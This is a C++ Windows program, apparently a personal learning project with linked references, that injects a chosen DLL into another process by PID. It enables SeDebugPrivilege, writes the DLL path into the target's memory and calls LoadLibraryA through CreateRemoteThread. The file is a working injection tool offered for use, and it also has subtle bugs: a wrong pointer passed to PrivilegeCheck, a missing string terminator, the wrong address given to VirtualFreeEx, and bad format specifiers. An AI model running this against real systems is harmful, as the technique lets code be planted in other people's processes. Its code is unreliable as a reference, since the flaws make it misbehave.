#include <stdio.h>
#include <windows.h>

#include <iostream>
#include <string>

/*
 * RESOURCES:
 * https://secarma.com/process-injection-part-1-the-theory/
 * https://stackoverflow.com/questions/56043589/how-to-recover-privileges-with-gettokeninformation-c
 * https://learn.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
 * https://stackoverflow.com/questions/17987589/adjusttokenprivileges-error-6-handle-invalid
 * https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation
 */

BOOL
HasPrivilege(LUID* luid, HANDLE* hToken)
{
  PRIVILEGE_SET privs;
  privs.PrivilegeCount = 1;
  privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
  privs.Privilege[0].Luid = *luid;
  privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
  BOOL bResult;
  PrivilegeCheck(&hToken, &privs, &bResult);
  return bResult;
}

bool
SetupSeDebug()
{
  printf("[*] Getting proc token...");
  HANDLE hToken;
  if (!OpenProcessToken(
        GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
    printf("\n[!] OpenProcessToken error: %lu\n", GetLastError());
    return false;
  }
  printf("success\n");

  printf("[*] Getting SeDebugPrivilege LUID...");
  TOKEN_PRIVILEGES tp;
  LUID luid;
  if (!LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid)) {
    printf("\n[!] LookupPrivilegeValue error: %lu\n", GetLastError());
    return false;
  }
  printf("success\n");

  printf("[*] Checking if we already SeDebugPrivilege...");
  if (!(HasPrivilege(&luid, &hToken))) {
    printf("false\n[*] Trying to add SeDebugPrivilege...");
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken,
                               FALSE,
                               &tp,
                               sizeof(TOKEN_PRIVILEGES),
                               (PTOKEN_PRIVILEGES)NULL,
                               (PDWORD)NULL)) {
      printf("[!] AdjustTokenPrivileges error: %lu\n", GetLastError());
      return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
      printf("[!] The token does not have the specified privilege, does the "
             "process have permissions?\n");
      return false;
    }
    printf("success!\n");
  }
  return true;
}

int
main(int argc, char* argv[])
{
  if (argc != 3) {
    printf("[!] Usage: DLL Injection.exe <PID> <DLL NAME>\n");
    return -1;
  }

  char* dllName;
  dllName = argv[2];

  if (GetModuleHandleA(dllName)) {
    printf("[!] DLL is already loaded, exiting...");
    return -1;
  }

  if (!SetupSeDebug()) {
    return -1;
  }

  int pid = std::stoi(argv[1]);
  printf("[*] Trying to get handle for PID %d...", pid);
  HANDLE hProcess;
  hProcess =
    OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
  if (!hProcess) {
    printf("\n[!] OpenProcess error: %lu\n", GetLastError());
    return -1;
  }
  printf("found, handle: %p\n", hProcess);

  printf("[*] Getting handle for kernel32.dll...");
  HMODULE hModule;
  hModule = GetModuleHandleW(L"kernel32.dll");
  if (!hModule) {
    printf("\n[!]GetModuleHandleW error: %ul", GetLastError());
    goto close_handle;
  }
  printf("success, handle = %p\n", hModule);

  printf("[*] Getting LoadLibrary address...");
  LPVOID pLoadLibrary;
  pLoadLibrary = (LPVOID)::GetProcAddress(hModule, "LoadLibraryA");
  if (!pLoadLibrary) {
    printf("\n[!] GetProcessAddress error: %ul", GetLastError());
    goto close_handle;
  }
  printf("success, address = %p\n", pLoadLibrary);

  printf("[*] Trying to allocate space...");
  LPVOID pBaseAddress;
  pBaseAddress = VirtualAllocEx(
    hProcess, NULL, strlen(dllName), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pBaseAddress) {
    printf("\n[!] VirtualAllocEx error: %ul", GetLastError());
    goto close_handle;
  }
  printf("success, allocated base address: %p\n", pBaseAddress);

  printf("[*] Writing process memory...");
  if (!WriteProcessMemory(
        hProcess, pBaseAddress, dllName, strlen(dllName), NULL)) {
    printf("\n[!] WriteProcessMemory error: %ul", GetLastError());
    goto close_handle;
  }
  printf("success, wrote %s into %d\n", dllName, pid);

  printf("[*] Creating thread...");
  HANDLE hThread;
  hThread = CreateRemoteThread(hProcess,
                               NULL,
                               NULL,
                               (LPTHREAD_START_ROUTINE)pLoadLibrary,
                               pBaseAddress,
                               0,
                               NULL);
  if (!hThread) {
    printf("\n[!] CreateRemoteThread error: %ul\n", GetLastError());
    goto close_handle;
  }
  printf("success, handle = %p\n", hThread);
  CloseHandle(hThread);
  CloseHandle(hModule);
  VirtualFreeEx(hProcess, dllName, 0, MEM_RELEASE);
  printf("[+] DLL injected, have fun :)");
  return 0;

close_handle:
  if (hProcess) {
    CloseHandle(hProcess);
  }
  if (hModule) {
    CloseHandle(hModule);
  }
  return -1;
}